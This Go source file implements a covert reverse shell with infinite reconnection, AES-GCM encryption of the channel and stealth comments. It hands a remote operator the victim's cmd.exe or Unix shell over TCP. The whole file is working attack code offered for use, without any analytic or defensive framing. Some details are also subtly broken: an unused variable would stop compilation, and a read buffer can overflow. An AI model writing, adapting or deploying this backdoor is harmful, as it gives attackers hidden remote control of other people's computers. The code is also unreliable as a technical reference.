package main

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "crypto/sha256"
    "encoding/binary"
    "io"
    "net"
    "os"
    "os/exec"
    "runtime"
    "time"
)

const (
    host       = "127.0.0.1"
    port       = "4444"
    key        = "your-secret-key-change-me-lol" // 32 chars for AES-256
    maxRetries = -1                             // -1 for infinite
    retryDelay = 5 * time.Second
)

type encryptedConn struct {
    conn   net.Conn
    cipher cipher.AEAD
}

func main() {
    // Stealth: No output, run in background
    hideConsole()

    attempt := 0
    for {
        if maxRetries != -1 && attempt >= maxRetries {
            break
        }
        
        if attempt > 0 {
            time.Sleep(retryDelay)
        }
        attempt++

        if err := connect(); err != nil {
            continue
        }
        
        attempt = 0 // Reset on successful connection
    }
}

func connect() error {
    conn, err := net.DialTimeout("tcp", host+":"+port, 10*time.Second)
    if err != nil {
        return err
    }
    defer conn.Close()

    // Setup encryption
    encConn, err := newEncryptedConn(conn)
    if err != nil {
        return err
    }

    // Get appropriate shell
    var cmd *exec.Cmd
    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd.exe")
    } else {
        shell := os.Getenv("SHELL")
        if shell == "" {
            shell = "/bin/sh"
        }
        cmd = exec.Command(shell)
    }

    cmd.Stdin = encConn
    cmd.Stdout = encConn
    cmd.Stderr = encConn

    // Run and wait for completion
    return cmd.Run()
}

func newEncryptedConn(conn net.Conn) (*encryptedConn, error) {
    // Derive key from password
    hash := sha256.Sum256([]byte(key))
    
    block, err := aes.NewCipher(hash[:])
    if err != nil {
        return nil, err
    }

    aead, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }

    return &encryptedConn{conn: conn, cipher: aead}, nil
}

func (ec *encryptedConn) Read(b []byte) (int, error) {
    // Read length prefix (4 bytes)
    lenBuf := make([]byte, 4)
    if _, err := io.ReadFull(ec.conn, lenBuf); err != nil {
        return 0, err
    }
    
    msgLen := binary.BigEndian.Uint32(lenBuf)
    if msgLen > 1024*1024 { // 1MB max message size
        return 0, io.ErrShortBuffer
    }

    // Read encrypted data
    ciphertext := make([]byte, msgLen)
    if _, err := io.ReadFull(ec.conn, ciphertext); err != nil {
        return 0, err
    }

    // Decrypt
    nonceSize := ec.cipher.NonceSize()
    if len(ciphertext) < nonceSize {
        return 0, io.ErrUnexpectedEOF
    }

    nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
    plaintext, err := ec.cipher.Open(nil, nonce, ciphertext, nil)
    if err != nil {
        return 0, err
    }

    copy(b, plaintext)
    return len(plaintext), nil
}

func (ec *encryptedConn) Write(b []byte) (int, error) {
    // Generate nonce
    nonce := make([]byte, ec.cipher.NonceSize())
    if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
        return 0, err
    }

    // Encrypt
    ciphertext := ec.cipher.Seal(nonce, nonce, b, nil)

    // Write length prefix
    lenBuf := make([]byte, 4)
    binary.BigEndian.PutUint32(lenBuf, uint32(len(ciphertext)))
    
    if _, err := ec.conn.Write(lenBuf); err != nil {
        return 0, err
    }

    // Write encrypted data
    n, err := ec.conn.Write(ciphertext)
    if err != nil {
        return 0, err
    }

    return len(b), nil
}

func (ec *encryptedConn) Close() error {
    return ec.conn.Close()
}

func hideConsole() {
    // Platform-specific stealth
    if runtime.GOOS == "windows" {
        // Note: Requires building with -ldflags "-H=windowsgui"
    }
}
